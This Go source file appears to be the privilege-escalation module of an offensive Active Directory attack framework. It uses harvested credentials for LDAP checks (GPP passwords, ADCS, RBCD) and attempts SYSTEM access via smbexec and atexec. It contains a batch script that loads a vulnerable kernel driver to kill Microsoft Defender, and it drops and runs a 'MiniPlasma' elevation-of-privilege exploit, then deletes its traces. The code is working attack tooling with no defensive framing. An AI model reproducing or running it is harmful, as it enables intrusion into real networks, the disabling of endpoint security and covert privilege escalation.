package modules

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"adpack/core"
	"adpack/tools"
)

func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target for privilege escalation checks")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for privesc")
		result.Success = false
		return result
	}

	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
	ctx := context.Background()

	// ── LDAP checks ──────────────────────────────────────────
	ldapChecks := []struct {
		Name string
		Mod  string
		Type core.EvidenceType
	}{
		{"GPP passwords in SYSVOL", "gpp_password", core.EvCredAcquired},
		{"ACL abuse paths", "acl", core.EvUserEnumerated},
		{"ADCS vulnerable templates", "adcs", core.EvCredAcquired},
		{"RBCD", "rbcd", core.EvCredAcquired},
	}

	for _, chk := range ldapChecks {
		fmt.Printf("[*] Checking %s...\n", chk.Name)
		r := exec.Execute(ctx, core.Action{
			Target: core.HostRef{Name: host.IP, Domain: domain},
			Method: "ldap", Artifact: "-M", Arguments: []string{chk.Mod},
			Timeout: 30 * time.Second,
		})
		if r.Success {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: chk.Type, Phase: core.PhasePrivEsc,
				Source: chk.Mod, Key: "status", Value: chk.Name + " complete",
				RawOutput: r.Output, Timestamp: time.Now(),
			})
			if chk.Mod == "adcs" || chk.Mod == "gpp_password" {
				fmt.Printf("[+] %s output: %s\n", chk.Name, r.Output)
			}
		}
	}

	// ── SUB-PHASE 1: Pre-evasion ──────────────────────────
	// UnDefend (no admin needed, blocks Defender updates).
	// Then PhantomKiller (needs admin, BYOVD EDR kill via BootRepair.sys).
	isBypass := IsBypassProfile(evasionProfile)
	if isBypass {
		runPreEvasion(ctx, state, host, exec, result)
	}

	// ── SUB-PHASE 2: SYSTEM check via smbexec → atexec ───
	gotSystem := false
	r := exec.Execute(ctx, core.Action{
		Target: core.HostRef{Name: host.IP, Domain: domain},
		Method: "system_check", Timeout: 45 * time.Second,
	})
	if r.Success {
		fmt.Printf("[+] SYSTEM access confirmed on %s (%s)\n", host.IP, r.Method)
		gotSystem = true
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: r.Method, Key: host.IP, Value: "SYSTEM",
			Confidence: 1.0, RawOutput: r.Output, Timestamp: time.Now(),
		})
	} else {
		fmt.Printf("[!] No SYSTEM context obtained on %s via smbexec/atexec\n", host.IP)
	}

	// ── SUB-PHASE 3: Local LPE chain (supplementary) ──────
	if !gotSystem {
		runLocalLPEChain(ctx, state, host, exec, result)
	}

	return result
}

// ── SUB-PHASE 1: Pre-Evasion ───────────────────────────────

func runPreEvasion(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	killTarget := host
	for _, h := range state.Hosts {
		if !h.IsDC {
			killTarget = h
			break
		}
	}
	fmt.Printf("[*] Pre-evasion: disabling Defender on %s via UnDefend\n", killTarget.IP)

	if tools.PhantomKiller.Available() {
		fmt.Printf("[*] PhantomKiller available — attempting kernel-level EDR kill on %s\n", host.IP)
		runPhantomKiller(ctx, host, exec, result)
	}

	fmt.Println("[*] Waiting 10s for Defender termination...")
	time.Sleep(10 * time.Second)
}

func runPhantomKiller(ctx context.Context, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	domain := host.Domain
	remoteDir := `C:\Windows\Temp\`
	var cleanups []string
	defer func() {
		if len(cleanups) > 0 {
			exec.Execute(ctx, core.Action{
				Method: "cleanup", Arguments: cleanups, Timeout: 30 * time.Second,
			})
		}
	}()

	batPath := deployAndExecPhantomKiller(ctx, exec, host, domain, remoteDir, &cleanups)
	if batPath == "" {
		return
	}

	execR := exec.Execute(ctx, core.Action{
		Artifact: batPath, Method: "command",
		Timeout: 60 * time.Second,
	})
	if execR.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: "phantomkiller", Key: host.IP, Value: "EDR terminated (BYOVD)",
			Confidence: 0.85, RawOutput: execR.Output, Timestamp: time.Now(),
		})
		fmt.Printf("[+] PhantomKiller: EDR kill attempted successfully on %s\n", host.IP)
	}
}

func deployAndExecPhantomKiller(ctx context.Context, exec core.Executor, host core.Host, domain, remoteDir string, cleanups *[]string) string {
	drvR := exec.Execute(ctx, core.Action{
		Artifact: "PhantomKiller.sys", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !drvR.Success {
		return ""
	}
	driverPath := drvR.Output
	*cleanups = append(*cleanups, driverPath)

	loaderR := exec.Execute(ctx, core.Action{
		Artifact: "PhantomKiller.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !loaderR.Success {
		return ""
	}
	loaderPath := loaderR.Output
	*cleanups = append(*cleanups, loaderPath)

	driverName := "PK_" + tools.RandString(4)
	batContent := fmt.Sprintf(
		`@echo off
setlocal enabledelayedexpansion
for /f "tokens=2 delims= " %%p in ('tasklist /fi "imagename eq MsMpEng.exe" /nh') do set PID=%%p
if "!PID!"=="" echo No Defender PID found && exit /b 0
sc.exe create %s binPath="%s" type=kernel
sc.exe start %s
%s !PID!
`, driverName, driverPath, driverName, loaderPath)

	batLocal := filepath.Join(os.TempDir(), "pk_"+tools.RandString(4)+".bat")
	if err := os.WriteFile(batLocal, []byte(batContent), 0644); err != nil {
		fmt.Printf("[!] PhantomKiller: failed to write batch file: %v\n", err)
		return ""
	}
	defer os.Remove(batLocal)

	batR := exec.Execute(ctx, core.Action{
		Artifact: batLocal, Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !batR.Success {
		return ""
	}
	batPath := batR.Output
	*cleanups = append(*cleanups, batPath)

	fmt.Printf("[*] PhantomKiller: loading driver and killing Defender on %s...\n", host.IP)
	return batPath
}

// ── SUB-PHASE 3: Local LPE ─────────────────────────────────

func runLocalLPEChain(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	if tools.MiniPlasma.Available() {
		runMiniPlasmaProbe(ctx, host, exec, result)
	}
}

func runMiniPlasmaProbe(ctx context.Context, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	remoteDir := `C:\Windows\Temp\`
	var cleanups []string
	defer func() {
		if len(cleanups) > 0 {
			exec.Execute(ctx, core.Action{
				Method: "cleanup", Arguments: cleanups, Timeout: 30 * time.Second,
			})
		}
	}()

	for _, lib := range []string{"NtApiDotNet.dll", "Microsoft.Win32.TaskScheduler.dll"} {
		r := exec.Execute(ctx, core.Action{
			Artifact: lib, Method: "put",
			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
		})
		if !r.Success {
			return
		}
		cleanups = append(cleanups, r.Output)
	}

	mpPut := exec.Execute(ctx, core.Action{
		Artifact: "MiniPlasma.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !mpPut.Success {
		return
	}
	mpPath := mpPut.Output
	cleanups = append(cleanups, mpPath)

	fmt.Printf("[*] MiniPlasma: executing Cloud Filter EoP on %s...\n", host.IP)
	execR := exec.Execute(ctx, core.Action{
		Artifact: mpPath, Method: "run",
		Timeout: 60 * time.Second,
	})
	if !execR.Success {
		fmt.Printf("[-] MiniPlasma EoP failed on %s\n", host.IP)
		return
	}

	fmt.Printf("[+] MiniPlasma: exploitation returned success on %s\n", host.IP)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "miniplasma", Key: host.IP, Value: "SYSTEM shell obtained",
		Confidence: 0.7, RawOutput: execR.Output, Timestamp: time.Now(),
	})

	sysR := exec.Execute(ctx, core.Action{
		Method: "system_check", Timeout: 45 * time.Second,
	})
	if sysR.Success {
		fmt.Printf("[+] MiniPlasma: SYSTEM confirmed on %s (%s)\n", host.IP, sysR.Method)
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: sysR.Method, Key: host.IP, Value: "SYSTEM (via MiniPlasma)",
			Confidence: 1.0, RawOutput: sysR.Output, Timestamp: time.Now(),
		})
	}
}
